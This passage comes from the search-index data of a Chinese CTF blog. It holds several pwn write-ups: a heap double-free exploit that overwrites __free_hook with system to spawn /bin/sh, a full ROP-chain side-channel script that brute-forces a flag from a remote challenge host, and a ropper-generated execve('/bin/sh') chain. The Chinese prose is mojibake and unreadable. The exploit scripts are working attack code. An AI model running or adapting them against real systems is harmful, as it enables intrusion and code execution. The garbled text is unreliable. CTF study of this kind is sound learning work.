= remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) def add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) add(0, 1071, b\u0026#34;\u0026#34;) # å¤§äº1072ä¼šé€€å‡ºï¼Œä½†æ˜¯1033å°±å¯ä»¥è¿›å…¥unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) delete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) add(3, 0x10, p64(system_addr + 0x394AE8)) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) delete(4) add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() XS Club æ£€æŸ¥ç¨‹åºæ¶æ„ æŸ¥çœ‹idaåç¼–è¯‘ä»£ç  ä¸»è¦å‡½æ•°ï¼š è¯»å–å­—ç¬¦ä¸²å¹¶åœ¨æœ«å°¾ç½®é›¶ ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œä»æœ€åçš„ç»“æœï¼ˆ\u0026quot;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026quot;ï¼‰æ¥çœ‹åƒæ˜¯base64ç¼–ç  base64è§£ç  key = base64.b64decode(\u0026#34;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#34;) å¤§è‡´æ€è·¯ ç¨‹åºç”¨æ²™ç®±å±è”½äº†execveçš„syscallï¼Œé‚£ä¹ˆå¤§è‡´æ€è·¯å°±æ˜¯åˆ©ç”¨openã€readçš„syscallè¯»å…¥flag\nè€Œç¨‹åºåˆæŠŠæ ‡å‡†è¾“å…¥æµå’Œæ ‡å‡†è¾“å‡ºæµå…³é—­äº†ï¼Œè¯´æ˜ä¸€æ¬¡è¿è¡Œåªèƒ½è¾“å…¥ä¸€æ¬¡ï¼Œè€Œä¸”ä¸ä¼šæœ‰å›æ˜¾\nä½†æ˜¯ç¨‹åºåˆæœ‰ä¸€ä¸ªstrcmpï¼Œè¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æµ‹ä¿¡é“çš„æ€è·¯æ¥è§£é¢˜\nåœ¨æˆ‘ä»¬è°ƒç”¨å®Œstrcmpåè·³è½¬åˆ°è¿™é‡Œï¼Œå¦‚æœå’Œflagç›¸ç¬¦å°±retåˆ°pauseï¼Œå¦åˆ™å°±ä¼šjmp raxä»è€ŒæŠ¥é”™é€€å‡º\næ„å»ºROP chain æˆ‘ä»¬å…ˆç”¨ropperçœ‹ä¸€ä¸‹ç¨‹åºçš„gadgetï¼š\nå‘ç°å¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„å¯ä»¥æ”¹å˜raxå’Œrdxçš„gadget\nå¦‚æœæƒ³è¦æ”¹å˜raxï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‡½æ•°çš„è¿”å›å€¼ä¿å­˜åœ¨raxè¿™ä¸ªç‰¹æ€§ï¼š\nset_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) ä½†æ˜¯åƒreadè¿™æ ·çš„å‡½æ•°ï¼Œå¾€å¾€æ˜¯å¿…é¡»è®¾ç½®rdxçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªæ”¹å˜rdxçš„gadget\nç»è¿‡è§‚å¯Ÿï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨csuä¸­çš„gadgetï¼š\næˆ‘ä»¬å¯ä»¥å…ˆç”¨csu1ä¸­çš„gadgetè®¾ç½®å¯„å­˜å™¨ï¼Œç„¶åå†è·³åˆ°csu2è®¾ç½®rdxï¼Œç„¶åå› ä¸ºcsu2ä¸­æœ‰ä¸€ä¸ªcall qword ptr [r12+rbx*8]ï¼Œæˆ‘ä»¬å¯ä»¥å°†r12çš„å€¼è®¾ä¸ºreadçš„gotå€¼ï¼Œrbxä¸º0ï¼Œè¿™æ ·å°±èƒ½æ‰§è¡Œreadå‡½æ•°\nå½“æˆ‘ä»¬æ‰§è¡Œå®Œreadå‡½æ•°æ—¶ï¼Œå› ä¸ºç‰©ç†ç›¸é‚»çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬ä¼šæ¯”è¾ƒrbpå’Œrbxçš„å€¼ï¼Œ\næ‰€ä»¥æˆ‘ä»¬è¦è®¾ç½®rbpä¸ç­‰äºrbx\nç„¶åæˆ‘ä»¬å°±è¿›å…¥äº†csu1ï¼Œè¿™é‡Œæœ‰ä¸€ä¸²çš„popï¼ŒåŠ ä¸Šå¤´éƒ¨çš„addï¼Œä¸€å…±æˆ‘ä»¬è¦è®¾ç½®56ä¸ªå­—èŠ‚æ¥è·³è¿‡è¿™äº›æŒ‡ä»¤åˆ°ret\nç„¶åæˆ‘ä»¬è®¾ç½®ä¸€ä¸‹rdiå’Œrsiå°±è½¬åˆ°call strcmp\næœ€åæˆ‘ä»¬å†å¡«å…¥ä¸€ä¸ªpauseçš„syscallå°±å¯ä»¥äº†ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰é€€å‡ºå°±ä¼šè°ƒç”¨pauseè€Œåœæ‰\nä½†é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¦æ€ä¹ˆå°†æˆ‘ä»¬æƒ³è¦ä¸flagæ¯”è¾ƒçš„å­—ç¬¦è¾“å…¥è¿›æ¥å‘¢ï¼Ÿ\næˆ‘ä»¬å¯ä»¥åœ¨è¯»å…¥invitation codeçš„æ—¶å€™å°†éœ€è¦æ¯”è¾ƒçš„å­—ç¬¦è¾“å…¥è¿›æ¥ï¼š\næ‰€ä»¥rop chainä¸ºï¼š\n# è®¡ç®—ä»£ç åŸºå€ pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - (0x561d75601161 - 0x561d75600000) # strcmpã€read strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] # è®¾ç½®rdiã€rsi pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 # syscall;ret syscall = pie_base + 0x00000000000009f5 # æœ‰ä¸€ä¸ªgadgetå¯ä»¥è®¾ç½®rdxä¸º0xa # set_rdx_10 = pie_base + 0x00000000000009f7 # ä¸€å¤§å †popï¼Œè®¾ç½®å¯„å­˜å™¨ csu1 = pie_base + 0x000000000000119A # å°†csuä¸­è®¾ç½®çš„å¯„å­˜å™¨çš„å€¼è½¬ç§»åˆ°å…¶ä»–å¯„å­˜å™¨ csu2 = pie_base + 0x0000000000001180 # bssèŠ‚å¼€å§‹ä½ç½® bss_start = pie_base + 0x0000000000202020 # \u0026#34;./flag\\x00\u0026#34;å­—ç¬¦ä¸²ä¿å­˜çš„ä½ç½® flag_str_addr = pie_base + 0x000000000020207a # å°è¯•çš„å­—ç¬¦ä¿å­˜çš„ä½ç½® try_chr_addr = pie_base + 0x000000000020207f # è¯»å…¥çš„flagæ–‡ä»¶å†…å®¹ä¿å­˜çš„ä½ç½® target_chr_addr = bss_start + 0x300 # æµ‹è¯•strcmpæˆä¸æˆåŠŸçš„gadget test_gadget = pie_base + 0x00000000000099b # è®¾ç½®raxä¸º2 set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # è®¾ç½®raxä¸º0x22 set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # è¯»å…¥è§£ç å†…å®¹ã€\u0026#34;./flag\\x00\u0026#34;å­—ç¬¦ä¸²ã€å½“å‰å°è¯•çš„å­—ç¬¦ io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ # 2å·syscallï¼Œæ‰“å¼€æ–‡ä»¶ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, # è¯»å–æ–‡ä»¶å†…å®¹ csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, # æ¯”å¯¹å­—ç¬¦ pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, # ç¬¬flag_lenä¸ªå­—ç¬¦ 0, strcmp_plt, test_gadget, # pauseç³»ç»Ÿè°ƒç”¨ set_rax_0x22, syscall ]) è®¾ç½®å»¶æ—¶å™¨ï¼Œä¿è¯ç¨‹åºæ­£å¸¸æ‰§è¡Œ å¯ä»¥ä½¿ç”¨sleepå‡½æ•°ã€recv(0.5)è¿˜æœ‰signalæ¨¡å—æ¥æ‹–æ—¶é—´ï¼Œç­‰å¾…ç¨‹åºè¿›ä¸€æ­¥æ‰§è¡Œ\nsignalæ¨¡å—\ndef handler(signum, frame): raise TimeoutError() signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False è¿™ä¸ªæ¨¡å—è®¾ç½®åœ¨ä¸€ç§’ä¹‹åå‘é€TimeoutErrorå¼‚å¸¸ï¼Œä½†å¦‚æœåœ¨è¿™ä¸€ç§’å†…recvåˆ°äº†'Okayï¼Œ'ï¼Œé‚£å°±å–æ¶ˆå‘é€ï¼Œå¦åˆ™å…³é—­è¿œç¨‹/åœæ­¢è¿›ç¨‹\nè¿™æ®µä»£ç ä¿è¯äº†ç¨‹åºåœ¨ä¸€ç§’å†…æ­£ç¡®æ‰§è¡Œï¼ˆä¸æ­£ç¡®æ‰§è¡Œçš„éƒ½æ­»äº†ï¼‰\nrecv(0.5)\ntry: io.recv(timeout=0.5) io.close() return True except: io.close() return False å¦‚æœåœ¨0x5ç§’å†…ç¨‹åºé€€å‡ºäº†ï¼Œå°±è¯´æ˜æ²¡æœ‰æ‰§è¡Œpauseç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥å°±å…³é—­è¿œç¨‹/åœæ­¢è¿›ç¨‹\nä¸ºç¬¬9ä¸ªå­—ç¬¦å•ç‹¬å†™rop chain å› ä¸ºæˆ‘ä»¬çš„rop chainä¸­æœ‰ä¸€æ¡flag_len+1ï¼Œè€Œå½“æˆ‘ä»¬çˆ†ç ´ç¬¬ä¹ä¸ªå­—ç¬¦æ—¶è¿™ä¸ªå€¼ä¸º0xaï¼Œåˆšå¥½å’Œ\\nçš„ASCIIç ä¸€æ ·ï¼Œæ‰€ä»¥ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå› æ­¤0xaä¸èƒ½å‡ºç°åœ¨rop chainä¸­\nè€Œæˆ‘ä»¬æ³¨æ„åˆ°syscallçš„gadgetåé¢ä¼šè‡ªåŠ¨å°†rdxè®¾ç½®ä¸º0xaï¼š é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å¸¸è§„æ€è·¯è°ƒç”¨readå³å¯ï¼Œä¸éœ€è¦ç”¨åˆ°csuï¼š\nif flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) å®Œæ•´exp from pwn import * import base64 import signal context.arch = \u0026#39;amd64\u0026#39; elf = ELF(\u0026#39;club\u0026#39;) def handler(signum, frame): raise TimeoutError() def pwn(try_c, flag_len): # io = process(\u0026#39;./club\u0026#39;) # io = remote(\u0026#39;127.0.0.1\u0026#39;, 9999) io = remote(\u0026#39;43.248.98.206\u0026#39;, 10075) io.sendafter(\u0026#39; is XS-Club, your name?\\n\u0026#39;, \u0026#39;a\u0026#39;) signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - \\ (0x561d75601161 - 0x561d75600000) strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 syscall = pie_base + 0x00000000000009f5 csu1 = pie_base + 0x000000000000119A csu2 = pie_base + 0x0000000000001180 bss_start = pie_base + 0x0000000000202020 flag_str_addr = pie_base + 0x000000000020207a try_chr_addr = pie_base + 0x000000000020207f target_chr_addr = bss_start + 0x300 test_gadget = pie_base + 0x00000000000099b set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) if flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) io.sendlineafter(\u0026#39; leave your phone number here\\n\u0026#39;, flat({0x28: rop_chain})) sleep(0.1) io.recvuntil(\u0026#39;~\\nNow you can join the club, go crazy!!! *\\\\(^o^)/*\\n\u0026#39;) try: io.recv(timeout=0.5) io.close() return True except: io.close() return False table = string.printable + \u0026#34;\\n\u0026#34; flag = \u0026#39;\u0026#39; t = time.time() while True: for c in table: if pwn(c, len(flag)): flag += c break if flag.endswith(\u0026#39;}\u0026#39;): success(flag) success(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) break else: info(flag) with open(\u0026#34;out\u0026#34;, \u0026#34;a\u0026#34;, encoding=\u0026#39;UTF-8\u0026#39;) as f: f.write(flag + \u0026#34;\\n\u0026#34;) info(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) sleep(0.1) ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A62022%E6%96%B0%E7%94%9F%E8%B5%9B%E5%88%9D%E8%B5%9B-%E9%9D%9E%E5%AE%98%E6%96%B9writeup/","section":"writeup","summary":"It is not so much our friends\u0026rsquo; help that helps us, as the confidence of their help. â€” Epicurus åŸé¢˜é“¾æ¥ EasyEasyEasy å› ä¸ºè¯»å…¥çš„æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•°ï¼Œæ‰€ä»¥å½“è¾“å…¥-1 çš„æ—¶å€™ä¹Ÿæ˜¯åˆæ³•çš„ è€Œæˆ‘ä»¬çŸ¥é“ï¼Œ-1%256 ä¹Ÿæ˜¯-1ï¼Œè€Œv5[-1","tags":["pwn"],"title":"æš¨å—å¤§å­¦2022æ–°ç”Ÿèµ›åˆèµ› éå®˜æ–¹WriteUp"},{"categories":["tricks"],"contents":" The extreme limit of wisdom, that\u0026rsquo;s what the public calls madness. â€” Jean Cocteau\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  exp è¿™é¢˜æ‰‹å·¥æ„é€ ropchainæ¯”è¾ƒå›°éš¾ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ropperæˆ–è€…ROPgadgetçš„ropchainåŠŸèƒ½æ¥ç”Ÿæˆï¼š\nropper ROPgadget exp éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå·¥å…·ç”Ÿæˆçš„ä»£ç å’Œæˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ä»£ç æ ¼å¼å’Œé£æ ¼ä¸Šéƒ½æœ‰ä¸€å®šå·®è·ï¼Œä»structåŒ…ä¸­å¯¼å…¥çš„packå‡½æ•°ä¹Ÿä¼šå’Œpwntoolsä¸­çš„packèµ·å†²çªï¼Œå¦‚æœä¸€å®šè¦ä½¿ç”¨structçš„packï¼Œå°±åœ¨å¯¼å…¥pwntoolsåå†å¯¼å…¥structï¼Œè¿™æ ·å°±å¯ä»¥è¦†ç›–æ‰pack\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes from struct import pack pss: bool = True fn: str = \u0026#34;./rop\u0026#34; libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;27311\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # éœ€è¦è‡ªè¡Œè®¾å®šoffset offset: int = 0xC + 4 # Generated by ropper ropchain generator # # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae IMAGE_BASE_0 = 0x08048000 def rebase_0(x): return pg(x + IMAGE_BASE_0) rop = b\u0026#39;\u0026#39; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/bin\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/sh\\x00\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2064) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x00000000) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x0000000b) rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; payload = flat({offset: rop}) sendline_after_clean(payload) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/","section":"tricks","summary":"The extreme limit of wisdom, that\u0026rsquo;s what the public calls madness. â€” Jean Cocteau æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  exp è¿™é¢˜æ‰‹å·¥æ„é€ ropchainæ¯”è¾ƒå›°éš¾ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ropperæˆ–è€…ROPgadgetçš„rop","tags":["pwn","ROPgadget","ropper","ropchain"],"title":"ä½¿ç”¨ROPgadgetã€ropperå·¥å…·æ„å»ºropchain"},{"categories":null,"contents":"","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/stats/stats/","section":"stats","summary":"","tags":null,"title":"ç»Ÿè®¡"},{"categories":["tricks"],"contents":" Kindness is the golden chain by which society is bound together. â€” Johann Wolfgang von Goethe\nå¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ æŸ¥çœ‹ç¨‹åºå½“å‰é»˜è®¤ä½¿ç”¨çš„libcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; è‡ªåŠ¨åŒ–è„šæœ¬ ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šlibc\n#!/bin/bash if [ -z \u0026#34;$*\u0026#34; ]; then strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; else strings $@ | grep \u0026#34;GNU C Library\u0026#34; fi æŸ¥çœ‹ç¨‹åºå½“å‰é»˜è®¤ä½¿ç”¨çš„libcç‰ˆæœ¬ ldd -v \u0026lt;ç¨‹åºå\u0026gt; ","date":"2022å¹´12æœˆ28æ—¥","permalink":"https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/","section":"tricks","summary":"Kindness is the golden chain by which society is bound together. â€” Johann Wolfgang von Goethe å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„libcç‰ˆæœ¬ æŸ¥çœ‹ç¨‹åºå½“å‰é»˜è®¤ä½¿ç”¨çš„libcç‰ˆæœ¬ æŸ¥","tags":["pwn","libc"],"title":"å¦‚ä½•æŸ¥çœ‹å½“å‰ç³»ç»Ÿlibcç‰ˆæœ¬"},{"categories":["tricks"],"contents":" Never give up, for that is just the place and time that the tide will turn. â€” Harriet Beecher Stowe\nå…ˆè¾“å…¥ç©ºæ ¼å°±å¥½äº†ï¼Œatoiä¼šè·³è¿‡ç©ºæ ¼\n","date":"2022å¹´12æœˆ27æ—¥","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/","section":"tricks","summary":"Never give 